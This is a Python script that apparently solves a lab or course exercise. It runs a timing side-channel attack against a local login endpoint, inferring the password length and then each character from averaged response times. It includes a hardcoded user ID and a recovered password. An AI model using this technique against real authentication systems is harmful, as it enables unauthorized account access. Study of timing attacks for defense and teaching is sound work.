import requests
import statistics
import time
from concurrent.futures import ThreadPoolExecutor, as_completed


def crack_password_from_resuming(url, user_name, password_length, optional_chars, difficulty, samples=4, resume_from=""):

    current_password = resume_from
    start_time = time.time()
    for length in range(len(resume_from) + 1, password_length + 1):
        times_per_char = {}
        print(f"Testing position {length}..., elapsed time: {time.time() - start_time:.2f}s")
        for char in optional_chars:
            test_password = current_password + char + "a" * (password_length - length)
            # on last char send to last char checker
            if length == password_length:
                last_char = check_last_char(url, user_name, current_password, optional_chars, difficulty, samples)
                if last_char:
                    current_password += last_char
                    print(f"Current password is now: {current_password}")
                    return current_password
            test_url = f"http://127.0.0.1/?user={user_name}&password={test_password}&difficulty={difficulty}"
            print(f"Testing char '{char}' for position {length}, url: {test_url} ")
            for _ in range(samples):
                response = requests.get(test_url)
                times_per_char[char] = times_per_char.get(char, 0) + response.elapsed.total_seconds()
            print(f"Finished testing char '{char}' for position {length}, times recorded: {times_per_char[char]}, avg time: {times_per_char[char]/samples:.6f} seconds")
        avg_times_per_char = {char: total_time / samples for char, total_time in times_per_char.items()}
        sorted_chars = sorted(avg_times_per_char, key=avg_times_per_char.get, reverse=True)
        best_char = sorted_chars[0]
        current_password += best_char
        print(f"Top 5 candidates for position {length}:")
        for candidate in sorted_chars[:5]:
            print(f"  Char: {candidate}, Avg Time: {avg_times_per_char[candidate]:.6f} seconds, diff from best: {avg_times_per_char[candidate] - avg_times_per_char[best_char]:.6f} seconds")
        print(f"Detected character at position {length}: {best_char}, current password: {current_password}")

    return current_password



def crack_password(url, user_name, password_length, optional_chars, difficulty, samples=4):

    current_password = ""
    start_time = time.time()
    for length in range(1, password_length + 1):
        times_per_char = {}
        print(f"Testing position {length}..., elapsed time: {time.time() - start_time:.2f}s")
        for char in optional_chars:
            test_password = current_password + char + "a" * (password_length - length)
            test_url = f"http://127.0.0.1/?user={user_name}&password={test_password}&difficulty={difficulty}"
            for _ in range(samples):
                response = requests.get(test_url)
                times_per_char[char] = times_per_char.get(char, 0) + response.elapsed.total_seconds()
        avg_times_per_char = {char: total_time / samples for char, total_time in times_per_char.items()}
        sorted_chars = sorted(avg_times_per_char, key=avg_times_per_char.get, reverse=True)
        best_char = sorted_chars[0]
        current_password += best_char
        print(f"Top 5 candidates for position {length}:")
        for candidate in sorted_chars[:5]:
            print(f"  Char: {candidate}, Avg Time: {avg_times_per_char[candidate]:.6f} seconds, diff from best: {avg_times_per_char[candidate] - avg_times_per_char[best_char]:.6f} seconds")
        print(f"Detected character at position {length}: {best_char}, current password: {current_password}")

    return current_password


def find_password_length(url, user_name, difficulty, samples=4):
    times_per_length = {}
    for length in range(1, 33):
        test_password = "a" * length
        test_url = f"http://127.0.0.1/?user={user_name}&password={test_password}&difficulty={difficulty}"
        for _ in range(samples):
            response = requests.get(test_url)
            times_per_length[length] = times_per_length.get(length, 0) + response.elapsed.total_seconds()

    avg_times_per_length = {length: total_time / samples for length, total_time in times_per_length.items()}
    print("Average response times per password length:")

    for length, avg_time in avg_times_per_length.items():
        print(f"Length {length}: {avg_time:.6f} seconds")

    passward_length = sorted(avg_times_per_length, key=avg_times_per_length.get)[-1]
    print(f"Detected password length: {passward_length}")


    return passward_length

def check_last_char(url, user_name, current_password, optional_chars, difficulty, samples=4):
    times_per_char = {}
    password_length = len(current_password) + 1
    print(f"Testing last character for position {password_length}...")
    for char in optional_chars:
        test_password = current_password + char
        test_url = f"http://127.0.0.1/?user={user_name}&password={test_password}&difficulty={difficulty}"
        response = requests.get(test_url)
        print("char: ", char, "response text: ", response.text)
        if response.text == "1":
            print(f"Found correct last character: {char}")
            print(f"Current password is now: {current_password + char}")
            return char

    print("No correct last character found")
    return None

def main():
    optional_chars = "abcdefghijklmnopqrstuvwxyz"
    max_length = 32
    user_name = "316279942"
    difficulty = 1
    password = "boovghcfslcajgfu"
    url = f"http://127.0.0.1/?user={user_name}&password={password}&difficulty={difficulty}"

    print("Try user name test: " + url)
    response = requests.get(url)
    print(response.text)
    print(f"Time: {response.elapsed.total_seconds():.6f} seconds")

    # print("Finding password length...")
    # password_length = find_password_length("http://127.0.0.1/", user_name, difficulty)


    password_length = 16
    print("current time stamp: ", time.time()  )
    resuming_pass = 'boovghcfslcajgf'
    print(f"Starting timing attack to find password resume from: " + resuming_pass)
    crack_password_resumed = crack_password_from_resuming("http://127.0.0.1/", user_name, password_length, optional_chars, difficulty, samples=5, resume_from=resuming_pass)
    print(f"Cracked password: {crack_password_resumed}")


    url = f"http://127.0.0.1/?user={user_name}&password={crack_password_resumed}&difficulty={difficulty}"
    print("Try user name test: " + url)
    response = requests.get(url)
    print(response.text)
    print(f"Time: {response.elapsed.total_seconds():.6f} seconds")


    # print("Starting timing attack to find password...")
    # crack_password_old = crack_password("http://127.0.0.1/", user_name, password_length, optional_chars, difficulty, samples=5)
    # print(f"Cracked password: {crack_password_old}")

    # Using optimized version (4 parallel threads, 5 samples per char)
    # cracked_password = crack_password_optimized("http://127.0.0.1/", user_name, password_length, optional_chars, difficulty, samples=5, threads=4)
    # print(f"Cracked password: {cracked_password}")

    # url = f"http://127.0.0.1/?user={user_name}&password={crack_password_old}&difficulty={difficulty}"
    print("Try user name test: " + url)
    response = requests.get(url)
    print(response.text)
    print(f"Time: {response.elapsed.total_seconds():.6f} seconds")

if __name__ == "__main__":
    main()